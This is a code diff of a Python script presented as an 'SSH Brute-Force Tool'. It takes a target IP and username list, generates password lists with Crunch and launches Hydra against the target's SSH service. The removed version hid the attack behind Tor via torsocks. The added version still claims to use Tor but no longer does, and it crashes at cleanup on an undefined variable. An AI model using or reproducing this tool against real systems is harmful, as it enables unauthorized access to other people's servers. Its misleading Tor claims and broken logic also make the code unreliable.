@@ -1,91 +1,109 @@
 import subprocess
-import logging
+import sys
 import os
+from colorama import Fore, Style, init
+import tempfile
 
-# Set up logging to file only (remove the console output for logs)
-logger = logging.getLogger()
-logger.setLevel(logging.INFO)
+# Initialize Colorama for Windows compatibility
+init(autoreset=True)
 
-# Create a file handler to log output to a file
-file_handler = logging.FileHandler('output.log', mode='a')
-file_handler.setLevel(logging.INFO)
+# Banner
+def print_banner():
+    print(Fore.GREEN + """
+    ============================================
+    |     SSH Brute-Force Tool with Hydra      |
+    |    Powered by Python + Colorama + Crunch |
+    |      Cracking SSH with Hydra & Crunch    |
+    |                                          |
+    ============================================
+    """)
 
-# Define a log formatter
-formatter = logging.Formatter('%(asctime)s - %(message)s')
-file_handler.setFormatter(formatter)
+# Function to generate password list using Crunch
+def generate_crunch_password_list(min_length, max_length, charset):
+    # Create a temporary file to store the generated password list
+    password_file = tempfile.NamedTemporaryFile(delete=False)
+    password_file.close()
 
-# Add file handler to the logger
-logger.addHandler(file_handler)
+    # Construct the Crunch command
+    crunch_command = [
+        "crunch", str(min_length), str(max_length), charset, 
+        "-o", password_file.name
+    ]
+    
+    print(Fore.YELLOW + f"[+] Generating passwords using Crunch (min: {min_length}, max: {max_length})...")
+    
+    try:
+        # Run Crunch to generate the password list
+        subprocess.run(crunch_command, check=True)
+    except subprocess.CalledProcessError as e:
+        print(Fore.RED + f"[!] Error occurred while generating password list with Crunch: {e}")
+        sys.exit(1)
 
-# Print the banner to the screen
-banner = """
-=============================================
-|     SSH Brute-Force Tool with Tor         |
-|   Powered by Python + Crunch + Hydra     |
-|   Uses Crunch to generate passwords      |
-|   Routes through Tor using Torsocks      |
-=============================================
-"""
-print(banner)
+    # Make sure the generated file exists and is non-empty
+    if os.path.exists(password_file.name) and os.path.getsize(password_file.name) > 0:
+        print(Fore.GREEN + f"[+] Password list generated successfully: {password_file.name}")
+    else:
+        print(Fore.RED + "[!] Crunch did not generate a valid password file.")
+        sys.exit(1)
 
-# Log user inputs
-target_ip = input("[?] Enter target IP address: ")
-print(f"[+] Target IP: {target_ip}")
-logger.info(f"[+] Target IP: {target_ip}")
+    return password_file.name
 
-user_list_file = input("[?] Enter path to username list file: ")
-print(f"[+] Username list: {user_list_file}")
-logger.info(f"[+] Username list: {user_list_file}")
+# Function to run Hydra attack with Tor
+def run_hydra_attack(target_ip, username_list, password_file):
+    print(Fore.YELLOW + f"[+] Starting Hydra attack on SSH at {target_ip} using Tor...")
 
-wordlist_option = input("[?] Do you want to use a custom wordlist for passwords (y/n): ").lower()
-logger.info(f"[+] Wordlist option: {wordlist_option}")
-print(f"[+] Wordlist option: {wordlist_option}")
+    # Construct the Hydra command
+    hydra_command = [
+        "hydra", "-L", username_list, "-P", password_file, 
+        "ssh://"+target_ip, "-t", "4"
+    ]
+    
+    try:
+        # Execute Hydra command
+        subprocess.run(hydra_command, check=True)
+    except subprocess.CalledProcessError as e:
+        print(Fore.RED + f"[!] Error occurred during Hydra attack: {e}")
+        sys.exit(1)
 
-# If user wants to use a custom wordlist, ask for the file path
-if wordlist_option == 'y':
-    wordlist_file = input("[?] Enter path to wordlist file: ")
-    print(f"[+] Wordlist file: {wordlist_file}")
-    logger.info(f"[+] Wordlist file: {wordlist_file}")
-else:
-    min_len = input("[?] Enter minimum password length: ")
-    max_len = input("[?] Enter maximum password length: ")
-    char_set = input("[?] Enter character set for Crunch (e.g., abc123): ")
+def main():
+    # Print banner
+    print_banner()
+    
+    # Get user inputs
+    target_ip = input(Fore.CYAN + "[?] Enter target IP address: ")
+    username_list = input(Fore.CYAN + "[?] Enter path to username list file: ")
+    
+    # Ensure the username list exists
+    if not os.path.exists(username_list):
+        print(Fore.RED + "[!] Username list file does not exist.")
+        sys.exit(1)
 
-    print(f"[+] Crunch started with command: crunch {min_len} {max_len} {char_set}")
-    logger.info(f"[+] Crunch started with command: crunch {min_len} {max_len} {char_set}")
+    # Ask user if they want to use a custom password list or generate one with Crunch
+    use_custom_password_list = input(Fore.CYAN + "[?] Do you want to use a custom password list file? (y/n): ").lower()
 
-    # Create a temporary password file to store Crunch output
-    password_file = "generated_passwords.txt"
+    if use_custom_password_list == 'y':
+        # Get the custom password list file path
+        password_list = input(Fore.CYAN + "[?] Enter path to the custom password list file: ")
+        if not os.path.exists(password_list):
+            print(Fore.RED + "[!] Password list file does not exist.")
+            sys.exit(1)
+        password_file = password_list
+    else:
+        # Get Crunch settings for password generation
+        min_length = int(input(Fore.CYAN + "[?] Enter minimum password length: "))
+        max_length = int(input(Fore.CYAN + "[?] Enter maximum password length: "))
+        charset = input(Fore.CYAN + "[?] Enter character set for Crunch (e.g., abc123): ")
 
-    # Run Crunch command and log output to file
-    crunch_command = f"crunch {min_len} {max_len} {char_set} -o {password_file}"
-    logger.info(f"[+] Running Crunch with command: {crunch_command}")
-    crunch_process = subprocess.Popen(crunch_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout, stderr = crunch_process.communicate()
+        # Generate password list using Crunch
+        password_file = generate_crunch_password_list(min_length, max_length, charset)
 
-    if stdout:
-        logger.info(f"[+] Crunch output: {stdout.decode()}")
-    if stderr:
-        logger.error(f"[!] Crunch errors: {stderr.decode()}")
+    # Run Hydra attack with the generated password list (or the custom password list) through Tor
+    run_hydra_attack(target_ip, username_list, password_file)
 
-    wordlist_file = password_file  # Use the generated password file for Hydra
+    # Clean up the temporary password file after the attack
+    if password_file != password_list:  # Only delete the temp file if it's not a custom list
+        os.remove(password_file)
 
-# Run Hydra with output from Crunch or user-provided wordlist
-hydra_command = f"torsocks hydra -L {user_list_file} -P {wordlist_file} -t 4 ssh://{target_ip}"
-logger.info(f"[+] Starting Hydra attack with command: {hydra_command}")
-print(f"[+] Starting Hydra attack with command: {hydra_command}")
-
-hydra_process = subprocess.Popen(hydra_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-hydra_stdout, hydra_stderr = hydra_process.communicate()
-
-if hydra_stdout:
-    logger.info(f"[+] Hydra output: {hydra_stdout.decode()}")
-if hydra_stderr:
-    logger.error(f"[!] Hydra errors: {hydra_stderr.decode()}")
-
-# Clean up the temporary password file after use (if created)
-if wordlist_option != 'y' and os.path.exists(password_file):
-    os.remove(password_file)
-
-print("[+] Attack completed. Check the log file for results.")
-logger.info("[+] Attack completed. Check the log file for results.")
+if __name__ == "__main__":
+    main()
+                 
